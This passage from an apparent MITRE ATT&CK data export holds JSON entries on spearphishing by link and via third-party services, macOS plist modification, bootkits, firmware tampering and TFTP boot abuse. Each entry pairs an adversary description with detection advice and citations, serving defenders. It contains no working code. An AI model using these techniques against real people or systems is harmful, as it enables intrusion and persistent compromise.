BlackTech June 2017),(Citation: McAfee Oceansalt Oct 2018),(Citation: FOX-IT May 2016 Mofang),(Citation: Unit 42 Gamaredon February 2022),(Citation: TrendMicro Gamaredon April 2020),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Rancor Unit42 June 2018),(Citation: DFIR Conti Bazar Nov 2021),(Citation: eSentire FIN7 July 2021),(Citation: Google TAG Ukraine Threat Landscape March 2022),(Citation: CERT-EE Gamaredon January 2021),(Citation: ESET Machete July 2019),(Citation: Talos Kimsuky Nov 2021),(Citation: Talos Transparent Tribe May 2021),(Citation: FireEye APT30),(Citation: FireEye FIN7 April 2017),(Citation: Google EXOTIC LILY March 2022),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Unit 42 Inception November 2018),(Citation: Unit 42 TA551 Jan 2021),(Citation: Malwarebytes Saint Bot April 2021),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: FireEye admin@338),(Citation: VirusBulletin Kimsuky October 2019),(Citation: Unit 42 Sofacy Feb 2018),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Trend Micro Tick November 2019),(Citation: Proofpoint NETWIRE December 2020),(Citation: Check Point Rocket Kitten),(Citation: DOJ FIN7 Aug 2018),(Citation: iSight Sandworm Oct 2014),(Citation: Unit42 Molerat Mar 2020),(Citation: Anomali Pirate Panda April 2020),(Citation: Trend Micro IXESHE 2012),(Citation: Medium Ali Salem Bumblebee April 2022),(Citation: Symantec Bumblebee June 2022),(Citation: Symantec Chafer February 2018),(Citation: Lazarus APT January 2022),(Citation: ProofPoint SettingContent-ms July 2018),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: Cylance Shaheen Nov 2018),(Citation: Group IB Cobalt Aug 2017),(Citation: SANS Windshift August 2018),(Citation: FBI FLASH APT39 September 2020),(Citation: Anomali Static Kitten February 2021),(Citation: TrendMicro TropicTrooper 2015),(Citation: Cyber Forensicator Silence Jan 2019),(Citation: Qualys LolZarus),(Citation: Trend Micro Qakbot May 2020),(Citation: FireEye MuddyWater Mar 2018),(Citation: FireEye APT10 April 2017),(Citation: Unit 42 Valak July 2020),(Citation: Talos Oblique RAT March 2021),(Citation: Cybereason Molerats Dec 2020),(Citation: TrendMicro Pawn Storm Dec 2020),(Citation: CheckPoint Naikon May 2020),(Citation: Secureworks GOLD CABIN),(Citation: G Data Sodinokibi June 2019),(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: Malwarebytes Konni Aug 2021),(Citation: Kroll Qakbot June 2020),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Volexity Patchwork June 2018),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: Uptycs Confucius APT Jan 2021),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: IBM TA505 April 2020),(Citation: Unit 42 ProjectM March 2016),(Citation: Proofpoint Leviathan Oct 2017),(Citation: CISA AA21-200A APT40 July 2021),(Citation: FireEye APT39 Jan 2019),(Citation: Kaspersky Cloud Atlas December 2014),(Citation: Recorded Future REDDELTA July 2020),(Citation: TrendMicro Taidoor),(Citation: Moran 2014),(Citation: ESET Telebots Dec 2016),(Citation: Cybereason Chaes Nov 2020),(Citation: CIS Emotet Apr 2017),(Citation: Carbon Black Emotet Apr 2019),(Citation: ATT QakBot April 2021),(Citation: ESET T3 Threat Report 2021),(Citation: Security Affairs DustSquad Oct 2018),(Citation: FireEye APT41 Aug 2019),(Citation: ESET Operation Spalax Jan 2021),(Citation: Secureworks IRON TILDEN Profile),(Citation: FireEye Fin8 May 2016),(Citation: Deep Instinct Black Basta August 2022),(Citation: Check Point Warzone Feb 2020),(Citation: Proofpoint TA416 November 2020),(Citation: FireEye Hancitor),(Citation: Secureworks IRON TWILIGHT Active Measures March 2017),(Citation: TrendMicro Tonto Team October 2020),(Citation: Talos Group123),(Citation: CheckPoint Bandook Nov 2020),(Citation: CitizenLab Tropic Trooper Aug 2018),(Citation: Cylance Sodinokibi July 2019),(Citation: ClearSky MuddyWater June 2019),(Citation: Accenture MUDCARP March 2019),(Citation: TrendMicro Cobalt Group Nov 2017),(Citation: Talos Emotet Jan 2019),(Citation: ESET OceanLotus Mar 2019),(Citation: Cylance Dust Storm),(Citation: Securelist ScarCruft May 2019),(Citation: Microsoft Holmium June 2020),(Citation: Unit 42 MuddyWater Nov 2017),(Citation: CrowdStrike Grim Spider May 2019),(Citation: Symantec Inception Framework March 2018),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: FireEye APT19),(Citation: Proofpoint TA459 April 2017),(Citation: Trend Micro Emotet Jan 2019),(Citation: Netskope Squirrelwaffle Oct 2021),(Citation: Cybereason Kimsuky November 2020),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Microsoft PLATINUM April 2016),(Citation: 360 Machete Sep 2020),(Citation: Malwarebytes Higaisa 2020),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: McAfee Sodinokibi October 2019),(Citation: Palo Alto Sofacy 06-2018),(Citation: Proofpoint Cobalt June 2017),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: Trend Micro Qakbot December 2020),(Citation: McAfee Bankshot),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Unit 42 Playbook Dec 2017),(Citation: FireEye Metamorfo Apr 2018),(Citation: Kaspersky QakBot September 2021),(Citation: Picus Sodinokibi January 2020),(Citation: Unit42 Redaman January 2019),(Citation: Malwarebytes Pony April 2016),(Citation: TrendMicro Trickbot Feb 2019),(Citation: MalwareBytes Lazarus-Andariel Conceals Code April 2021),(Citation: IBM IcedID November 2017),(Citation: Kaspersky MoleRATs April 2019),(Citation: HP SVCReady Jun 2022),(Citation: Securelist Machete Aug 2014),(Citation: Microsoft DUBNIUM July 2016),(Citation: ClearSky Lazarus Aug 2020),(Citation: Secureworks IRON HEMLOCK Profile),(Citation: Talos Lokibot Jan 2021),(Citation: Amnesty Intl. Ocean Lotus February 2021),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Talos Frankenstein June 2019),(Citation: Zscaler Higaisa 2020),(Citation: Group IB Ransomware September 2020),(Citation: Carbon Black HotCroissant April 2020),(Citation: Visa FIN6 Feb 2019),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Symantec Emotet Jul 2018),(Citation: F-Secure The Dukes),(Citation: Gigamon Berserk Bear October 2021),(Citation: Cybereason TA505 April 2019),(Citation: Securelist Sofacy Feb 2018),(Citation: ThreatConnect Kimsuky September 2020),(Citation: Securelist Dropping Elephant),(Citation: FireEye APT10 Sept 2018),(Citation: Malwarebytes Emotet Dec 2017),(Citation: Securelist Kimsuky Sept 2013),(Citation: Proofpoint TA505 Mar 2018),(Citation: US-CERT Ukraine Feb 2016),(Citation: Talos PoetRAT April 2020),(Citation: Cyberint Qakbot May 2021),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Cymmetria Patchwork),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Proofpoint TA505 Sep 2017),(Citation: ACSC Email Spoofing),(Citation: Microsoft Anti Spoofing)"}
{"ID":"T1566.002","name":"Phishing: Spearphishing Link","description":"Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an \"IDN homograph attack\").(Citation: CISA IDN ST05-016)\n\nAdversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: Trend Micro Pawn Storm OAuth 2017) These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. (Citation: Microsoft OAuth 2.0 Consent Phishing 2021)","url":"https://attack.mitre.org/techniques/T1566/002","created":"02 March 2020","last modified":"11 April 2023","version":"2.4","tactics":"Initial Access","detection":"URL inspection within email (including expanding shortened links) can help detect links leading to known malicious sites as well as links redirecting to adversary infrastructure based by upon suspicious OAuth patterns with unusual TLDs.(Citation: Microsoft OAuth 2.0 Consent Phishing 2021). Detonation chambers can be used to detect these links and either automatically go to these sites to determine if they're potentially malicious, or wait and capture the content if a user visits the link.\n\nFiltering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)\n\nBecause this technique usually involves user interaction on the endpoint, many of the possible detections take place once [User Execution](https://attack.mitre.org/techniques/T1204) occurs.","platforms":"Google Workspace, Linux, Office 365, SaaS, Windows, macOS","data sources":"Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1566","defenses bypassed":null,"contributors":"Jeff Sakowicz, Microsoft Identity Developer Platform Services (IDPM Services); Kobi Haimovich, CardinalOps; Mark Wee; Menachem Goldstein; Philip Winther; Saisha Agrawal, Microsoft Threat Intelligent Center (MSTIC); Shailesh Tiwary (Indian Army)","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Symantec Elderwood Sept 2012),(Citation: Mandiant APT1),(Citation: FireEye APT33 Sept 2017),(Citation: FireEye Hacking FIN4 Video Dec 2014),(Citation: Cybereason Oceanlotus May 2017),(Citation: FireEye APT32 April 2020),(Citation: CSM Elderwood Sept 2012),(Citation: CISA AppleJeus Feb 2021),(Citation: MSTIC NOBELIUM May 2021),(Citation: ATT Sidewinder January 2021),(Citation: Secureworks IRON RITUAL USAID Phish May 2021),(Citation: DOJ GRU Indictment Jul 2018),(Citation: ESET Grandoreiro April 2020),(Citation: ESET OceanLotus),(Citation: Microsoft Targeting Elections September 2020),(Citation: ClearSky Kittens Back 3 August 2020),(Citation: Trend Micro TA505 June 2019),(Citation: Unit 42 NETWIRE April 2020),(Citation: McAfee Night Dragon),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: KISA Operation Muzabi),(Citation: Zscaler Bazar September 2020),(Citation: Proofpoint Bumblebee April 2022),(Citation: Proofpoint TA505 Jan 2019),(Citation: US-CERT Emotet Jul 2018),(Citation: Certfa Charming Kitten January 2021),(Citation: Trend Micro Muddy Water March 2021),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: Cybereason Bumblebee August 2022),(Citation: Talos Cobalt Group July 2018),(Citation: TrendMicro Confucius APT Aug 2021),(Citation: Proofpoint TA505 October 2019),(Citation: Picus Emotet Dec 2018),(Citation: Volexity Ocean Lotus November 2020),(Citation: TrendMicro BlackTech June 2017),(Citation: FOX-IT May 2016 Mofang),(Citation: Threatpost Hancitor),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Mandiant No Easy Breach),(Citation: ESET Machete July 2019),(Citation: Talos Transparent Tribe May 2021),(Citation: Google EXOTIC LILY March 2022),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: SentinelOne Valak June 2020),(Citation: Symantec Elfin Mar 2019),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: SANS Windshift August 2018),(Citation: FBI FLASH APT39 September 2020),(Citation: Anomali Static Kitten February 2021),(Citation: Google Election Threats October 2020),(Citation: Trend Micro Qakbot May 2020),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: Talos Oblique RAT March 2021),(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: TrendMicro EarthLusca 2022),(Citation: Kroll Qakbot June 2020),(Citation: ESET Lazarus Jun 2020),(Citation: Secureworks Cobalt Gypsy Feb 2017),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: Trend Micro Banking Malware Jan 2019),(Citation: Proofpoint Leviathan Oct 2017),(Citation: CISA AA21-200A APT40 July 2021),(Citation: FireEye APT39 Jan 2019),(Citation: FireEye Clandestine Wolf),(Citation: Symantec Patchwork),(Citation: CIS Emotet Apr 2017),(Citation: ATT QakBot April 2021),(Citation: Cyberreason Anchor December 2019),(Citation: ESET Operation Spalax Jan 2021),(Citation: AADInternals Documentation),(Citation: EST Kimsuky April 2019),(Citation: Kaspersky LuminousMoth July 2021),(Citation: Secureworks IRON TWILIGHT Active Measures March 2017),(Citation: Microsoft Unidentified Dec 2018),(Citation: ESET Zebrocy May 2019),(Citation: Talos Emotet Jan 2019),(Citation: ESET EvilNum July 2020),(Citation: Cylance Dust Storm),(Citation: Cylance Machete Mar 2017),(Citation: Trend Micro Black Basta October 2022),(Citation: IBM Grandoreiro April 2020),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Trend Micro Qakbot December 2020),(Citation: Kaspersky QakBot September 2021),(Citation: Malwarebytes Pony April 2016),(Citation: Cybereason Bazar July 2020),(Citation: Kaspersky MoleRATs April 2019),(Citation: ClearSky Lazarus Aug 2020),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Kaspersky Emotet Jan 2019),(Citation: Amnesty Intl. Ocean Lotus February 2021),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: McAfee Dianxun March 2021),(Citation: Group IB Ransomware September 2020),(Citation: Unit 42 BackConfig May 2020),(Citation: Netscout Stolen Pencil Dec 2018),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: FireEye APT29 Nov 2018),(Citation: Symantec Emotet Jul 2018),(Citation: US District Court Indictment GRU Oct 2018),(Citation: Malwarebytes Emotet Dec 2017),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Secureworks GOLD KINGSWOOD September 2018),(Citation: Cyble Sidewinder September 2020),(Citation: CrowdStrike Wizard Spider October 2020),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Proofpoint TA505 Sep 2017),(Citation: ACSC Email Spoofing),(Citation: Microsoft Anti Spoofing)"}
{"ID":"T1566.003","name":"Phishing: Spearphishing via Service","description":"Adversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.\n\nA common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.","url":"https://attack.mitre.org/techniques/T1566/003","created":"02 March 2020","last modified":"30 March 2023","version":"2.0","tactics":"Initial Access","detection":"Because most common third-party services used for spearphishing via service leverage TLS encryption, SSL/TLS inspection is generally required to detect the initial communication/delivery. With SSL/TLS inspection intrusion detection signatures or other security gateway appliances may be able to detect malware. \n\nAnti-virus can potentially detect malicious documents and files that are downloaded on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203) or usage of malicious scripts.","platforms":"Linux, Windows, macOS","data sources":"Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1566","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: MSTIC NOBELIUM May 2021),(Citation: ClearSky Kittens Back 3 August 2020),(Citation: SecureWorks Mia Ash July 2017),(Citation: FireEye Operation Saffron Rose 2013),(Citation: ESET Lazarus Jun 2020),(Citation: FireEye APT34 July 2019),(Citation: Lookout Dark Caracal Jan 2018),(Citation: Google TAG Lazarus Jan 2021),(Citation: Microsoft Phosphorus Mar 2019),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: Google EXOTIC LILY March 2022),(Citation: ClearSky Lazarus Aug 2020),(Citation: SANS Windshift August 2018),(Citation: Security Intelligence More Eggs Aug 2019),"}
{"ID":"T1647","name":"Plist File Modification","description":"Adversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses. macOS applications use plist files, such as the <code>info.plist</code> file, to store properties and configuration settings that inform the operating system how to handle the application at runtime. Plist files are structured metadata in key-value pairs formatted in XML based on Apple's Core Foundation DTD. Plist files can be saved in text or binary format.(Citation: fileinfo plist file description) \n\nAdversaries can modify key-value pairs in plist files to influence system behaviors, such as hiding the execution of an application (i.e. [Hidden Window](https://attack.mitre.org/techniques/T1564/003)) or running additional commands for persistence (ex: [Launch Agent](https://attack.mitre.org/techniques/T1543/001)/[Launch Daemon](https://attack.mitre.org/techniques/T1543/004) or [Re-opened Applications](https://attack.mitre.org/techniques/T1547/007)).\n\nFor example, adversaries can add a malicious application path to the `~/Library/Preferences/com.apple.dock.plist` file, which controls apps that appear in the Dock. Adversaries can also modify the <code>LSUIElement</code> key in an application’s <code>info.plist</code> file  to run the app in the background. Adversaries can also insert key-value pairs to insert environment variables, such as <code>LSEnvironment</code>, to enable persistence via [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006).(Citation: wardle chp2 persistence)(Citation: eset_osx_flashback)","url":"https://attack.mitre.org/techniques/T1647","created":"09 April 2022","last modified":"20 April 2022","version":"1.0","tactics":"Defense Evasion","detection":"Monitor for common command-line editors used to modify plist files located in auto-run locations, such as <code>\\~/LaunchAgents</code>, <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code>, and an application's <code>Info.plist</code>. \n\nMonitor for plist file modification immediately followed by code execution from <code>\\~/Library/Scripts</code> and <code>~/Library/Preferences</code>. Also, monitor for significant changes to any path pointers in a modified plist.\n\nIdentify new services executed from plist modified in the previous user's session. ","platforms":"macOS","data sources":"Command: Command Execution, File: File Modification, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: trendmicro xcsset xcode project 2020),(Citation: Apple Developer Doco Hardened Runtime)"}
{"ID":"T1542","name":"Pre-OS Boot","description":"Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.(Citation: Wikipedia Booting)\n\nAdversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.","url":"https://attack.mitre.org/techniques/T1542","created":"13 November 2019","last modified":"19 April 2022","version":"1.1","tactics":"Defense Evasion, Persistence","detection":"Perform integrity checking on pre-OS boot mechanisms that can be manipulated for malicious purposes. Take snapshots of boot records and firmware and compare against known good images. Log changes to boot records, BIOS, and EFI, which can be performed by API calls, and compare against known good behavior and patching.\n\nDisk check, forensic utilities, and data from device drivers (i.e. processes and API calls) may reveal anomalies that warrant deeper investigation.(Citation: ITWorld Hard Disk Health Dec 2014)","platforms":"Linux, Network, Windows, macOS","data sources":"Command: Command Execution, Drive: Drive Modification, Driver: Driver Metadata, Firmware: Firmware Modification, Network Traffic: Network Connection Creation, Process: OS API Execution","is sub-technique":false,"sub-technique of":null,"defenses bypassed":"Anti-virus, File monitoring, Host intrusion prevention systems","contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: TCG Trusted Platform Module),(Citation: TechNet Secure Boot Process)"}
{"ID":"T1542.003","name":"Pre-OS Boot: Bootkit","description":"Adversaries may use bootkits to persist on systems. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\n\nA bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: Mandiant M Trends 2016) The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. (Citation: Lau 2011)\n\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.","url":"https://attack.mitre.org/techniques/T1542/003","created":"19 December 2019","last modified":"30 March 2023","version":"1.1","tactics":"Defense Evasion, Persistence","detection":"Perform integrity checking on MBR and VBR. Take snapshots of MBR and VBR and compare against known good samples. Report changes to MBR and VBR as they occur for indicators of suspicious activity and further analysis.","platforms":"Linux, Windows","data sources":"Drive: Drive Modification","is sub-technique":true,"sub-technique of":"T1542","defenses bypassed":"Anti-virus, File monitoring, Host intrusion prevention systems","contributors":null,"permissions required":"Administrator, SYSTEM","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Microsoft FinFisher March 2018),(Citation: Novetta Blockbuster),(Citation: FireEye Bootkits),(Citation: FireEye BOOTRASH SANS),(Citation: ESET Carberp March 2012),(Citation: Eclypsium Trickboot December 2020),(Citation: Microsoft WhisperGate January 2022),(Citation: Medium S2W WhisperGate January 2022),(Citation: ESET Sednit Part 3),(Citation: Novetta Blockbuster Destructive Malware),(Citation: Mandiant M Trends 2016),(Citation: FireEye APT41 Aug 2019),(Citation: FinFisher Citation),(Citation: Cybereason WhisperGate February 2022),(Citation: Crowdstrike WhisperGate January 2022),(Citation: Cisco Ukraine Wipers January 2022),(Citation: TCG Trusted Platform Module),(Citation: TechNet Secure Boot Process)"}
{"ID":"T1542.002","name":"Pre-OS Boot: Component Firmware","description":"Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1542/001) but conducted upon other system components/devices that may not have the same capability or level of integrity checking.\n\nMalicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.","url":"https://attack.mitre.org/techniques/T1542/002","created":"19 December 2019","last modified":"01 April 2022","version":"1.1","tactics":"Defense Evasion, Persistence","detection":"Data and telemetry from use of device drivers (i.e. processes and API calls) and/or provided by SMART (Self-Monitoring, Analysis and Reporting Technology) disk monitoring may reveal malicious manipulations of components.(Citation: SanDisk SMART)(Citation: SmartMontools) Otherwise, this technique may be difficult to detect since malicious activity is taking place on system components possibly outside the purview of OS security and integrity mechanisms.\n\nDisk check and forensic utilities may reveal indicators of malicious firmware such as strings, unexpected disk partition table entries, or blocks of otherwise unusual memory that warrant deeper investigation.(Citation: ITWorld Hard Disk Health Dec 2014) Also consider comparing components, including hashes of component firmware and behavior, against known good images.","platforms":"Linux, Windows, macOS","data sources":"Driver: Driver Metadata, Firmware: Firmware Modification, Process: OS API Execution","is sub-technique":true,"sub-technique of":"T1542","defenses bypassed":"Anti-virus, File monitoring, Host intrusion prevention systems","contributors":null,"permissions required":"SYSTEM","supports remote":null,"system requirements":"Ability to update component device firmware from the host operating system.","impact type":null,"effective permissions":null,"relationship citations":"(Citation: NCSC Cyclops Blink February 2022),(Citation: Kaspersky Equation QA),"}
{"ID":"T1542.004","name":"Pre-OS Boot: ROMMONkit","description":"Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect. (Citation: Cisco Synful Knock Evolution)(Citation: Cisco Blog Legacy Device Attacks)\n\n\nROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar to [TFTP Boot](https://attack.mitre.org/techniques/T1542/005), an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect.","url":"https://attack.mitre.org/techniques/T1542/004","created":"20 October 2020","last modified":"22 October 2020","version":"1.0","tactics":"Defense Evasion, Persistence","detection":"There are no documented means for defenders to validate the operation of the ROMMON outside of vendor support. If a network device is suspected of being compromised, contact the vendor to assist in further investigation.","platforms":"Network","data sources":"Firmware: Firmware Modification","is sub-technique":true,"sub-technique of":"T1542","defenses bypassed":null,"contributors":null,"permissions required":"Administrator","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: Cisco IOS Software Integrity Assurance - Secure Boot),(Citation: Cisco IOS Software Integrity Assurance - Image File Integrity),(Citation: Cisco IOS Software Integrity Assurance - Change Control),(Citation: Cisco IOS Software Integrity Assurance - Image File Verification)"}
{"ID":"T1542.001","name":"Pre-OS Boot: System Firmware","description":"Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer. (Citation: Wikipedia BIOS) (Citation: Wikipedia UEFI) (Citation: About UEFI)\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.","url":"https://attack.mitre.org/techniques/T1542/001","created":"19 December 2019","last modified":"30 March 2023","version":"1.0","tactics":"Defense Evasion, Persistence","detection":"System firmware manipulation may be detected. (Citation: MITRE Trustworthy Firmware Measurement) Dump and inspect BIOS images on vulnerable systems and compare against known good images. (Citation: MITRE Copernicus) Analyze differences to determine if malicious changes have occurred. Log attempts to read/write to BIOS and compare against known patching behavior.\n\nLikewise, EFI modules can be collected and compared against a known-clean list of EFI executable binaries to detect potentially malicious modules. The CHIPSEC framework can be used for analysis to determine if firmware modifications have been performed. (Citation: McAfee CHIPSEC Blog) (Citation: Github CHIPSEC) (Citation: Intel HackingTeam UEFI Rootkit)","platforms":"Windows","data sources":"Firmware: Firmware Modification","is sub-technique":true,"sub-technique of":"T1542","defenses bypassed":"Anti-virus, File monitoring, Host intrusion prevention systems","contributors":"Jean-Ian Boutin, ESET; McAfee; Ryan Becwar","permissions required":"Administrator, SYSTEM","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Ge 2011),(Citation: ESET LoJax Sept 2018),(Citation: TrendMicro Hacking Team UEFI),(Citation: TCG Trusted Platform Module),(Citation: ESET LoJax Sept 2018),(Citation: Intel Hardware-based Security Technologies)"}
{"ID":"T1542.005","name":"Pre-OS Boot: TFTP Boot","description":"Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images.\n\nAdversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with [Modify System Image](https://attack.mitre.org/techniques/T1601) to load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar to [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) and may result in the network device running a modified image. (Citation: Cisco Blog Legacy Device Attacks)","url":"https://attack.mitre.org/techniques/T1542/005","created":"20 October 2020","last modified":"22 October 2020","version":"1.0","tactics":"Defense Evasion, Persistence","detection":"Consider comparing a copy of the network device configuration and system image against a known-good version to discover unauthorized changes to system boot, startup configuration, or the running OS. (Citation: Cisco IOS Software Integrity Assurance - Secure Boot) (Citation: Cisco IOS Software Integrity Assurance - Image File Verification)The same process can be accomplished through a comparison of the run-time memory, though this is non-trivial and may require assistance from the vendor.  (Citation: Cisco IOS Software Integrity Assurance - Run-Time Memory Verification)\n\nReview command history in either the console or as part of the running memory to determine if unauthorized or suspicious commands were used to modify device configuration. (Citation: Cisco IOS Software Integrity Assurance - Command History) Check boot information including system uptime, image booted, and startup configuration to determine if results are consistent with expected behavior in the environment. (Citation: Cisco IOS Software Integrity Assurance - Boot Information) Monitor unusual connections or connection attempts to the device that may specifically target TFTP or other file-sharing protocols.","platforms":"Network","data sources":"Command: Command Execution, Firmware: Firmware Modification, Network Traffic: Network Connection Creation","is sub-technique":true,"sub-technique of":"T1542","defenses bypassed":null,"contributors":null,"permissions required":"Administrator","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: Cisco IOS Software Integrity Assurance - TACACS),(Citation: Cisco IOS Software Integrity Assurance - AAA),(Citation: Cisco IOS Software Integrity Assurance - Image File Integrity),(Citation: Cisco IOS Software Integrity Assurance - Secure 